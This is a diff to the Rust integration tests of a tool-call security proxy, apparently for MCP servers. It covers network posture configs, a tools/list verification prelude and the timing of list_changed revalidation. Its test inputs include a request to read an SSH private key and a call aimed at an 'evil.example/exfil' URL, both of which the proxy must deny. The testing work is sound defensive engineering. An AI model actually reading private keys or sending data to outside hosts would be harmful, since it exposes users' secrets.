@@ -46,6 +46,14 @@ defaults {
     environment {
         allow "MCP_WRIT_FIXTURE"
     }
+    network {
+        // Bare `allow host="*"` at the defaults level is a posture: it
+        // turns off `deny_all_others` for the global outbound gate so the
+        // evil.example fetch legs reach the tool's own `network` /
+        // trajectory rules. (A named `allow host=` entry would instead
+        // make every tool network-restricted and demand a url arg.)
+        allow host="*"
+    }
 }
 logging level="info" fail_closed=#false
 server "tool-enforcement" {
@@ -70,6 +78,14 @@ defaults {
     }
     environment {
         allow "MCP_WRIT_FIXTURE"
+    }
+    network {
+        // Bare `allow host="*"` at the defaults level is a posture: it
+        // turns off `deny_all_others` for the global outbound gate so the
+        // evil.example fetch legs reach the tool's own `network` /
+        // trajectory rules. (A named `allow host=` entry would instead
+        // make every tool network-restricted and demand a url arg.)
+        allow host="*"
     }
 }
 logging level="info" fail_closed=#false
@@ -190,6 +206,25 @@ async fn handshake_2025_with_init(
     stdin.flush().await.expect("flush initialized");
 }
 
+/// Publish a verified `tools/list` — the generation gate denies
+/// `tools/call` until a client listing has completed. Used by tests
+/// whose scenario starts with calls.
+async fn publish_tools_list(
+    stdin: &mut tokio::process::ChildStdin,
+    reader: &mut tokio::io::Lines<BufReader<tokio::process::ChildStdout>>,
+) {
+    let resp = send_and_recv(
+        stdin,
+        reader,
+        r#"{"jsonrpc":"2.0","id":"hs-list","method":"tools/list","params":{}}"#,
+    )
+    .await;
+    assert!(
+        json_has_result(&resp),
+        "prelude tools/list must verify: {resp}"
+    );
+}
+
 async fn send_and_recv(
     stdin: &mut tokio::process::ChildStdin,
     reader: &mut tokio::io::Lines<BufReader<tokio::process::ChildStdout>>,
@@ -221,35 +256,6 @@ async fn recv_jsonrpc(
     })
     .await
     .expect("timeout waiting for JSON-RPC response from mcp-writ")
-}
-
-async fn send_and_recv_allow_eof(
-    stdin: &mut tokio::process::ChildStdin,
-    reader: &mut tokio::io::Lines<BufReader<tokio::process::ChildStdout>>,
-    request: &str,
-) -> Option<String> {
-    if stdin
-        .write_all(format!("{request}\n").as_bytes())
-        .await
-        .is_err()
-    {
-        return None;
-    }
-    if stdin.flush().await.is_err() {
-        return None;
-    }
-    timeout(Duration::from_secs(TIMEOUT_SECS), async {
-        loop {
-            match reader.next_line().await {
-                Ok(Some(line)) if line.starts_with("{\"jsonrpc\"") => return Some(line),
-                Ok(Some(_)) => continue,
-                Ok(None) | Err(_) => return None,
-            }
-        }
-    })
-    .await
-    .ok()
-    .flatten()
 }
 
 fn json_has_method(response: &str) -> bool {
@@ -318,6 +324,7 @@ async fn secret_overlay_denies_ssh_key_allows_notes() {
     let _guard = ChildGuard(child);
     let mut reader = BufReader::new(stdout).lines();
     handshake_2025(&mut stdin, &mut reader).await;
+    publish_tools_list(&mut stdin, &mut reader).await;
 
     let denied = r#"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/workspace/.ssh/id_rsa"}}}"#;
     let deny_resp = send_and_recv(&mut stdin, &mut reader, denied).await;
@@ -351,6 +358,7 @@ async fn read_only_side_effect_denies_url_argument() {
     let _guard = ChildGuard(child);
     let mut reader = BufReader::new(stdout).lines();
     handshake_2025(&mut stdin, &mut reader).await;
+    publish_tools_list(&mut stdin, &mut reader).await;
 
     let request = r#"{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"read_file","arguments":{"url":"https://evil.example/exfil"}}}"#;
     let response = send_and_recv(&mut stdin, &mut reader, request).await;
@@ -478,6 +486,7 @@ async fn trajectory_on_denies_network_after_successful_read() {
     let _guard = ChildGuard(child);
     let mut reader = BufReader::new(stdout).lines();
     handshake_2025(&mut stdin, &mut reader).await;
+    publish_tools_list(&mut stdin, &mut reader).await;
 
     let read = r#"{"jsonrpc":"2.0","id":50,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/workspace/notes.txt"}}}"#;
     let read_resp = send_and_recv(&mut stdin, &mut reader, read).await;
@@ -515,6 +524,7 @@ async fn trajectory_off_allows_read_then_network() {
     let _guard = ChildGuard(child);
     let mut reader = BufReader::new(stdout).lines();
     handshake_2025(&mut stdin, &mut reader).await;
+    publish_tools_list(&mut stdin, &mut reader).await;
 
     let read = r#"{"jsonrpc":"2.0","id":60,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/workspace/notes.txt"}}}"#;
     let read_resp = send_and_recv(&mut stdin, &mut reader, read).await;
@@ -546,6 +556,7 @@ async fn trajectory_is_error_write_does_not_clear_read() {
     let _guard = ChildGuard(child);
     let mut reader = BufReader::new(stdout).lines();
     handshake_2025(&mut stdin, &mut reader).await;
+    publish_tools_list(&mut stdin, &mut reader).await;
 
     let read = r#"{"jsonrpc":"2.0","id":70,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/workspace/notes.txt"}}}"#;
     let read_resp = send_and_recv(&mut stdin, &mut reader, read).await;
@@ -587,6 +598,7 @@ async fn trajectory_s2c_request_same_id_does_not_drop_pending_read() {
     let _guard = ChildGuard(child);
     let mut reader = BufReader::new(stdout).lines();
     handshake_2025(&mut stdin, &mut reader).await;
+    publish_tools_list(&mut stdin, &mut reader).await;
 
     let read = r#"{"jsonrpc":"2.0","id":80,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/workspace/notes.txt"}}}"#;
     stdin
@@ -645,6 +657,88 @@ async fn list_changed_revalidates_then_forwards_and_denies_mid_relist_call() {
     let mut reader = BufReader::new(stdout).lines();
     handshake_2025(&mut stdin, &mut reader).await;
 
+    // The initialize-time verification probe consumed the clean first
+    // list and the fixture emitted list_changed right after it — the
+    // guard holds the notification and resumes a revalidation relist as
+    // soon as the probe's verified emit lands. The fixture delays that
+    // relist answer by 400ms; poll calls until one lands inside the
+    // window (too early denies "no verified", too late is published).
+    let call = r#"{"jsonrpc":"2.0","id":71,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/workspace/notes.txt"}}}"#;
+    let mut forwarded_notif = String::new();
+    let mut denied_mid_relist = false;
+    let deadline = std::time::Instant::now() + Duration::from_secs(TIMEOUT_SECS);
+    while std::time::Instant::now() < deadline && !denied_mid_relist {
+        stdin
+            .write_all(format!("{call}\n").as_bytes())
+            .await
+            .expect("write call");
+        stdin.flush().await.expect("flush call");
+        // Read until the response carrying this id — the forwarded
+        // list_changed may interleave once the relist verifies.
+        let resp = timeout(Duration::from_secs(TIMEOUT_SECS), async {
+            loop {
+                let line = reader
+                    .next_line()
+                    .await
+                    .expect("IO error reading mcp-writ stdout")
+                    .expect("unexpected EOF waiting for call response");
+                if !line.starts_with("{\"jsonrpc\"") {
+                    continue;
+                }
+                if json_method(&line).as_deref() == Some("notifications/tools/list_changed") {
+                    forwarded_notif = line;
+                    continue;
+                }
+                if line.contains("\"id\":71") {
+                    return line;
+                }
+            }
+        })
+        .await
+        .expect("timeout waiting for mid-relist call response");
+        assert!(json_has_error(&resp), "got: {resp}");
+        let msg = error_message(&resp);
+        if msg.contains("revalidation") || msg.contains("in progress") {
+            denied_mid_relist = true;
+        } else {
+            assert!(
+                msg.contains("no verified tools/list"),
+                "unexpected mid-relist deny reason: {msg}"
+            );
+            tokio::time::sleep(Duration::from_millis(20)).await;
+        }
+    }
+    assert!(
+        denied_mid_relist,
+        "never observed the mid-relist tools/call deny"
+    );
+
+    let notif = if forwarded_notif.is_empty() {
+        timeout(Duration::from_secs(TIMEOUT_SECS), async {
+            loop {
+                let line = reader
+                    .next_line()
+                    .await
+                    .expect("IO error reading mcp-writ stdout")
+                    .expect("unexpected EOF waiting for list_changed");
+                if line.starts_with("{\"jsonrpc\"") {
+                    return line;
+                }
+            }
+        })
+        .await
+        .expect("timeout waiting for forwarded list_changed")
+    } else {
+        forwarded_notif
+    };
+    assert_eq!(
+        json_method(&notif).as_deref(),
+        Some("notifications/tools/list_changed"),
+        "notification must be forwarded only after revalidation: {notif}"
+    );
+
+    // The revalidated listing is now published — the client's own
+    // tools/list gets the verified response with every field forwarded.
     let list = r#"{"jsonrpc":"2.0","id":70,"method":"tools/list","params":{}}"#;
     let list_resp = send_and_recv(&mut stdin, &mut reader, list).await;
     assert!(json_has_result(&list_resp), "got: {list_resp}");
@@ -655,39 +749,6 @@ async fn list_changed_revalidates_then_forwards_and_denies_mid_relist_call() {
     assert!(
         list_resp.contains("readOnlyHint"),
         "Verified response forwarding must forward annotations: {list_resp}"
-    );
-
-    // Server already emitted list_changed; guard holds it and re-lists.
-    // Give S2C a beat to set list_busy before the mid-relist probe. The
-    // fixture delays the second tools/list by 400ms, so this stays mid-flight.
-    tokio::time::sleep(Duration::from_millis(80)).await;
-    let call = r#"{"jsonrpc":"2.0","id":71,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/workspace/notes.txt"}}}"#;
-    let call_resp = send_and_recv(&mut stdin, &mut reader, call).await;
-    assert!(json_has_error(&call_resp), "got: {call_resp}");
-    let msg = error_message(&call_resp);
-    assert!(
-        msg.contains("revalidation") || msg.contains("in progress"),
-        "expected mid-relist deny, got: {msg}"
-    );
-
-    let notif = timeout(Duration::from_secs(TIMEOUT_SECS), async {
-        loop {
-            let line = reader
-                .next_line()
-                .await
-                .expect("IO error reading mcp-writ stdout")
-                .expect("unexpected EOF waiting for list_changed");
-            if line.starts_with("{\"jsonrpc\"") {
-                return line;
-            }
-        }
-    })
-    .await
-    .expect("timeout waiting for forwarded list_changed");
-    assert_eq!(
-        json_method(&notif).as_deref(),
-        Some("notifications/tools/list_changed"),
-        "notification must be forwarded only after revalidation: {notif}"
     );
 
     drop(stdin);
@@ -709,10 +770,11 @@ async fn list_changed_poisoned_relist_aborts_without_forwarding_notification() {
     let mut reader = BufReader::new(stdout).lines();
     handshake_2025(&mut stdin, &mut reader).await;
 
-    let list = r#"{"jsonrpc":"2.0","id":80,"method":"tools/list","params":{}}"#;
-    let list_resp = send_and_recv(&mut stdin, &mut reader, list).await;
-    assert!(json_has_result(&list_resp), "got: {list_resp}");
-
+    // The poison scenario runs server-side: the initialize-time
+    // verification probe consumes the clean first list, the fixture
+    // emits list_changed, and the guard's own relist is the poisoned
+    // one — the session must abort on its own, so no client traffic is
+    // needed here (a client request would just race the abort).
     let next = timeout(Duration::from_secs(TIMEOUT_SECS), async {
         loop {
             let line = reader
@@ -755,38 +817,42 @@ async fn list_changed_relist_error_keeps_tools_call_denied() {
     let mut reader = BufReader::new(stdout).lines();
     handshake_2025(&mut stdin, &mut reader).await;
 
-    let list = r#"{"jsonrpc":"2.0","id":90,"method":"tools/list","params":{}}"#;
-    let list_resp = send_and_recv(&mut stdin, &mut reader, list).await;
-    assert!(json_has_result(&list_resp), "got: {list_resp}");
-
-    // Same race as the happy-path relist test: wait for S2C to observe
-    // list_changed (and set list_busy) before the mid-relist tools/call.
-    tokio::time::sleep(Duration::from_millis(80)).await;
+    // The initialize-time verification probe consumed the clean first
+    // list, the fixture emitted list_changed, and the guard's internal
+    // relist is answered with a JSON-RPC error — the session must abort
+    // without forwarding the notification or ever letting a call reach
+    // the child (which would answer {"ok":true}). Race a call into the
+    // window, then drain to EOF.
     let mid = r#"{"jsonrpc":"2.0","id":91,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/workspace/notes.txt"}}}"#;
-    let mid_resp = send_and_recv(&mut stdin, &mut reader, mid).await;
-    assert!(json_has_error(&mid_resp), "got: {mid_resp}");
-    assert!(
-        error_message(&mid_resp).contains("revalidation")
-            || error_message(&mid_resp).contains("in progress"),
-        "got: {mid_resp}"
-    );
+    let _ = stdin.write_all(format!("{mid}\n").as_bytes()).await;
+    let _ = stdin.flush().await;
 
-    // After the delayed JSON-RPC error, busy must stay set until abort so a
-    // concurrent tools/call cannot slip through to the child (which would
-    // answer {"ok":true}).
-    tokio::time::sleep(Duration::from_millis(500)).await;
-    let late = r#"{"jsonrpc":"2.0","id":92,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/workspace/notes.txt"}}}"#;
-    let late_resp = send_and_recv_allow_eof(&mut stdin, &mut reader, late).await;
-    if let Some(resp) = late_resp {
-        assert!(
-            json_has_error(&resp),
-            "tools/call after relist error must stay denied, got: {resp}"
-        );
-        assert!(
-            !resp.contains("\"ok\":true"),
-            "must not reach the child after relist error: {resp}"
-        );
-    }
+    let drained = timeout(Duration::from_secs(TIMEOUT_SECS), async {
+        let mut forwarded = Vec::new();
+        while let Some(line) = reader
+            .next_line()
+            .await
+            .expect("IO error reading mcp-writ stdout")
+        {
+            if line.starts_with("{\"jsonrpc\"") {
+                forwarded.push(line);
+            }
+        }
+        forwarded
+    })
+    .await
+    .expect("session must abort (stdout EOF) after relist error");
+
+    assert!(
+        drained
+            .iter()
+            .all(|l| json_method(l).as_deref() != Some("notifications/tools/list_changed")),
+        "must not forward list_changed after relist error: {drained:?}"
+    );
+    assert!(
+        drained.iter().all(|l| !l.contains("\"ok\":true")),
+        "must not reach the child after relist error: {drained:?}"
+    );
 
     drop(stdin);
 }
@@ -1219,10 +1285,12 @@ async fn tools_list_dry_run_keeps_all_tools_and_observes() {
         .lines()
         .filter(|line| line.contains("\"event_type\":\"tools_list.filtered\""))
         .collect();
-    assert_eq!(
-        filtered.len(),
-        1,
-        "expected exactly one tools_list.filtered event: {audit}"
+    // The initialize-time verification probe runs its own filtered
+    // listing, and a client list answered from the probe's verified copy
+    // may not re-emit — so the count is 1 or 2 depending on the race.
+    assert!(
+        !filtered.is_empty(),
+        "expected at least one tools_list.filtered event: {audit}"
     );
     assert!(
         filtered[0].contains("\"action\":\"observed\""),
